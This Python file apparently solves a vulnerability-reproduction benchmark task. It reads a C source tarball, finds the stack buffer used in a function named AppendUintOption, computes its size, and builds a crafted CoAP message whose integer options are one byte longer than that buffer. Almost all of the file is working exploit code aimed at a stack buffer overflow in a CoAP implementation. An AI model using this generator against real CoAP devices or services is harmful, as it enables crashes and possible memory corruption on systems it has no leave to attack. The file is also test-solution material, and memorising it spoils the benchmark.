import os
import re
import tarfile
import ast
import ctypes
from typing import Dict, Optional, Tuple, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        buf_size = self._infer_append_uint_option_stack_buf_size(src_path)
        if buf_size is None or buf_size <= 0 or buf_size > 4096:
            overflow_len = 15
        else:
            overflow_len = buf_size + 1
            if overflow_len <= 0:
                overflow_len = 15

        if overflow_len <= 6:
            option_numbers = [6, 7, 12]
        elif overflow_len <= 12:
            option_numbers = [6, 12]
        else:
            option_numbers = [6]

        return self._build_coap_message_with_oversize_uint_options(option_numbers, overflow_len)

    def _build_coap_message_with_oversize_uint_options(self, option_numbers: List[int], opt_len: int) -> bytes:
        if opt_len < 1:
            opt_len = 1
        header = bytes([0x40, 0x01, 0x00, 0x00])  # ver=1, CON, tkl=0, code=GET, msgid=0
        prev = 0
        out = bytearray(header)
        val = b"\x01" + (b"\x00" * (opt_len - 1))
        for num in sorted(option_numbers):
            if num < prev:
                continue
            delta = num - prev
            out += self._encode_coap_option(delta, len(val), val)
            prev = num
        return bytes(out)

    def _encode_coap_option(self, delta: int, length: int, value: bytes) -> bytes:
        d_nib, d_ext = self._encode_coap_opt_nibble(delta)
        l_nib, l_ext = self._encode_coap_opt_nibble(length)
        first = bytes([(d_nib << 4) | l_nib])
        return first + d_ext + l_ext + value

    def _encode_coap_opt_nibble(self, x: int) -> Tuple[int, bytes]:
        if x <= 12:
            return x, b""
        if x <= 268:
            return 13, bytes([x - 13])
        if x <= 65804:
            y = x - 269
            return 14, bytes([(y >> 8) & 0xFF, y & 0xFF])
        return 15, b""

    def _infer_append_uint_option_stack_buf_size(self, src_path: str) -> Optional[int]:
        macros: Dict[str, str] = {}
        func_text = None

        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                for m in members:
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    name = m.name.lower()
                    if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".h") or name.endswith(".hpp") or name.endswith(".inc")):
                        continue
                    try:
                        raw = tf.extractfile(m).read()
                    except Exception:
                        continue
                    text = raw.decode("utf-8", errors="ignore")
                    self._collect_macros_from_text(text, macros)
                for m in members:
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > 3_000_000:
                        continue
                    name = m.name.lower()
                    if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp")):
                        continue
                    try:
                        raw = tf.extractfile(m).read()
                    except Exception:
                        continue
                    text = raw.decode("utf-8", errors="ignore")
                    if "AppendUintOption" not in text:
                        continue
                    ft = self._extract_c_like_function(text, "AppendUintOption")
                    if ft:
                        func_text = ft
                        break
        except Exception:
            func_text = None

        if not func_text:
            return None

        arrays = self._extract_local_arrays(func_text, macros)
        if not arrays:
            return None

        risky = self._choose_risky_array(func_text, arrays)
        if risky is not None:
            return risky[2]

        byte_arrays = [a for a in arrays if a[3] == 1 and 0 < a[2] <= 256]
        if byte_arrays:
            byte_arrays.sort(key=lambda t: t[2])
            return byte_arrays[0][2]

        arrays.sort(key=lambda t: t[2])
        if arrays and arrays[0][2] > 0:
            return arrays[0][2]
        return None

    def _collect_macros_from_text(self, text: str, macros: Dict[str, str]) -> None:
        lines = text.splitlines()
        i = 0
        while i < len(lines):
            line = lines[i]
            if "#define" not in line:
                i += 1
                continue
            m = re.match(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.*)$", line)
            if not m:
                i += 1
                continue
            name = m.group(1)
            val = m.group(2).strip()
            if "(" in name:
                i += 1
                continue
            while val.endswith("\\") and i + 1 < len(lines):
                val = val[:-1].rstrip() + " " + lines[i + 1].strip()
                i += 1
            val = re.split(r"//|/\*", val, 1)[0].strip()
            if not val:
                i += 1
                continue
            if len(val) > 200:
                i += 1
                continue
            macros.setdefault(name, val)
            i += 1

    def _extract_c_like_function(self, text: str, func_name: str) -> Optional[str]:
        idx = text.find(func_name)
        if idx < 0:
            return None
        best = None
        start_search = 0
        for _ in range(10):
            idx = text.find(func_name, start_search)
            if idx < 0:
                break
            paren = text.find("(", idx + len(func_name))
            if paren < 0:
                start_search = idx + len(func_name)
                continue
            brace = text.find("{", paren)
            if brace < 0:
                start_search = idx + len(func_name)
                continue
            head = text[max(0, idx - 200):idx + len(func_name) + 1]
            if re.search(r"\b" + re.escape(func_name) + r"\b\s*\(", head) is None:
                start_search = idx + len(func_name)
                continue
            end = self._match_braces(text, brace)
            if end is None:
                start_search = idx + len(func_name)
                continue
            func_text = text[idx:end + 1]
            best = func_text
            break
        return best

    def _match_braces(self, text: str, open_brace_idx: int) -> Optional[int]:
        depth = 0
        i = open_brace_idx
        n = len(text)
        in_s = False
        in_d = False
        in_line_comment = False
        in_block_comment = False
        while i < n:
            c = text[i]
            if in_line_comment:
                if c == "\n":
                    in_line_comment = False
                i += 1
                continue
            if in_block_comment:
                if c == "*" and i + 1 < n and text[i + 1] == "/":
                    in_block_comment = False
                    i += 2
                    continue
                i += 1
                continue
            if not in_s and not in_d:
                if c == "/" and i + 1 < n and text[i + 1] == "/":
                    in_line_comment = True
                    i += 2
                    continue
                if c == "/" and i + 1 < n and text[i + 1] == "*":
                    in_block_comment = True
                    i += 2
                    continue
            if not in_d and c == "'" and (i == 0 or text[i - 1] != "\\"):
                in_s = not in_s
                i += 1
                continue
            if not in_s and c == '"' and (i == 0 or text[i - 1] != "\\"):
                in_d = not in_d
                i += 1
                continue
            if in_s or in_d:
                i += 1
                continue
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    return i
            i += 1
        return None

    def _extract_local_arrays(self, func_text: str, macros: Dict[str, str]) -> List[Tuple[str, str, int, int]]:
        type_sizes = {
            "uint8_t": 1,
            "int8_t": 1,
            "char": 1,
            "signed char": 1,
            "unsigned char": 1,
            "uint16_t": 2,
            "int16_t": 2,
            "uint32_t": 4,
            "int32_t": 4,
            "uint64_t": 8,
            "int64_t": 8,
            "size_t": ctypes.sizeof(ctypes.c_size_t),
            "int": ctypes.sizeof(ctypes.c_int),
            "unsigned": ctypes.sizeof(ctypes.c_uint),
            "unsigned int": ctypes.sizeof(ctypes.c_uint),
        }

        pat = re.compile(
            r"\b(?P<type>uint8_t|int8_t|uint16_t|int16_t|uint32_t|int32_t|uint64_t|int64_t|size_t|unsigned\s+char|signed\s+char|char|unsigned\s+int|unsigned|int)\s+"
            r"(?P<name>[A-Za-z_]\w*)\s*\[\s*(?P<expr>[^\]]+)\s*\]",
            re.MULTILINE,
        )
        arrays: List[Tuple[str, str, int, int]] = []
        for m in pat.finditer(func_text):
            t = " ".join(m.group("type").split())
            name = m.group("name")
            expr = m.group("expr").strip()
            elem_sz = type_sizes.get(t)
            if elem_sz is None:
                continue
            count = self._eval_c_int_expr(expr, macros)
            if count is None or count <= 0 or count > 1_000_000:
                continue
            byte_sz = int(count) * int(elem_sz)
            if byte_sz <= 0 or byte_sz > 1_000_000:
                continue
            arrays.append((name, t, byte_sz, elem_sz))
        return arrays

    def _choose_risky_array(self, func_text: str, arrays: List[Tuple[str, str, int, int]]) -> Optional[Tuple[str, str, int, int]]:
        arr_map = {a[0]: a for a in arrays}
        memcpy_pat = re.compile(
            r"\bmem(?:cpy|move)\s*\(\s*(?:&\s*)?(?P<dest>[A-Za-z_]\w*)\b[^,]*,\s*[^,]*,\s*(?P<len>[^)]+)\)",
            re.MULTILINE,
        )
        candidates = []
        for m in memcpy_pat.finditer(func_text):
            dest = m.group("dest")
            if dest not in arr_map:
                continue
            ln = m.group("len").strip()
            ln_clean = re.sub(r"\s+", " ", ln)
            if re.fullmatch(r"(?:0x[0-9a-fA-F]+|\d+)(?:[uUlL]*)", ln_clean):
                continue
            candidates.append(arr_map[dest])
        if candidates:
            candidates.sort(key=lambda t: t[2])
            return candidates[0]

        buf_like = [a for a in arrays if a[3] == 1 and (("buf" in a[0].lower()) or ("value" in a[0].lower()) or ("tmp" in a[0].lower()) or ("temp" in a[0].lower()))]
        if buf_like:
            buf_like.sort(key=lambda t: t[2])
            return buf_like[0]
        return None

    def _eval_c_int_expr(self, expr: str, macros: Dict[str, str]) -> Optional[int]:
        if not expr:
            return None
        e = expr.strip()

        for _ in range(3):
            e = re.sub(r"/\*.*?\*/", "", e)
            e = re.sub(r"//.*", "", e)
            e = e.strip()

        e = re.sub(r"\bCHAR_BIT\b", "8", e)
        e = re.sub(r"([0-9]+)[uUlL]+\b", r"\1", e)
        e = re.sub(r"(0x[0-9a-fA-F]+)[uUlL]+\b", r"\1", e)

        def sizeof_repl(m: re.Match) -> str:
            t = " ".join(m.group(1).strip().split())
            sz = self._sizeof_c_type(t)
            if sz is None:
                return "0"
            return str(sz)

        e = re.sub(r"\bsizeof\s*\(\s*([^)]+)\s*\)", sizeof_repl, e)

        for t in ["uint8_t", "int8_t", "uint16_t", "int16_t", "uint32_t", "int32_t", "uint64_t", "int64_t", "size_t", "unsigned", "unsigned int", "int", "char", "signed char", "unsigned char"]:
            e = re.sub(r"\(\s*" + re.escape(t) + r"\s*\)", "", e)

        e = e.replace("(", " ( ").replace(")", " ) ")
        e = re.sub(r"\s+", " ", e).strip()
        if not e:
            return None

        try:
            node = ast.parse(e, mode="eval")
        except Exception:
            return None

        def eval_node(n, depth: int = 0) -> Optional[int]:
            if depth > 25:
                return None
            if isinstance(n, ast.Expression):
                return eval_node(n.body, depth + 1)
            if isinstance(n, ast.Constant):
                if isinstance(n.value, bool):
                    return int(n.value)
                if isinstance(n.value, int):
                    return int(n.value)
                return None
            if isinstance(n, ast.Name):
                name = n.id
                if name in macros:
                    if name == expr:
                        return None
                    return self._eval_c_int_expr(macros[name], macros)
                return None
            if isinstance(n, ast.UnaryOp):
                v = eval_node(n.operand, depth + 1)
                if v is None:
                    return None
                if isinstance(n.op, ast.UAdd):
                    return +v
                if isinstance(n.op, ast.USub):
                    return -v
                if isinstance(n.op, ast.Invert):
                    return ~v
                return None
            if isinstance(n, ast.BinOp):
                a = eval_node(n.left, depth + 1)
                b = eval_node(n.right, depth + 1)
                if a is None or b is None:
                    return None
                op = n.op
                try:
                    if isinstance(op, ast.Add):
                        return a + b
                    if isinstance(op, ast.Sub):
                        return a - b
                    if isinstance(op, ast.Mult):
                        return a * b
                    if isinstance(op, (ast.Div, ast.FloorDiv)):
                        if b == 0:
                            return None
                        return a // b
                    if isinstance(op, ast.Mod):
                        if b == 0:
                            return None
                        return a % b
                    if isinstance(op, ast.BitOr):
                        return a | b
                    if isinstance(op, ast.BitAnd):
                        return a & b
                    if isinstance(op, ast.BitXor):
                        return a ^ b
                    if isinstance(op, ast.LShift):
                        if b < 0 or b > 63:
                            return None
                        return a << b
                    if isinstance(op, ast.RShift):
                        if b < 0 or b > 63:
                            return None
                        return a >> b
                except Exception:
                    return None
                return None
            return None

        try:
            val = eval_node(node)
            if val is None:
                return None
            return int(val)
        except Exception:
            return None

    def _sizeof_c_type(self, t: str) -> Optional[int]:
        t = " ".join(t.strip().split())
        mapping = {
            "uint8_t": 1,
            "int8_t": 1,
            "unsigned char": 1,
            "signed char": 1,
            "char": 1,
            "uint16_t": 2,
            "int16_t": 2,
            "uint32_t": 4,
            "int32_t": 4,
            "uint64_t": 8,
            "int64_t": 8,
            "size_t": ctypes.sizeof(ctypes.c_size_t),
            "int": ctypes.sizeof(ctypes.c_int),
            "unsigned": ctypes.sizeof(ctypes.c_uint),
            "unsigned int": ctypes.sizeof(ctypes.c_uint),
            "long": ctypes.sizeof(ctypes.c_long),
            "unsigned long": ctypes.sizeof(ctypes.c_ulong),
            "long long": ctypes.sizeof(ctypes.c_longlong),
            "unsigned long long": ctypes.sizeof(ctypes.c_ulonglong),
        }
        if t in mapping:
            return mapping[t]
        t2 = t.replace("const ", "").replace("volatile ", "").strip()
        if t2 in mapping:
            return mapping[t2]
        return None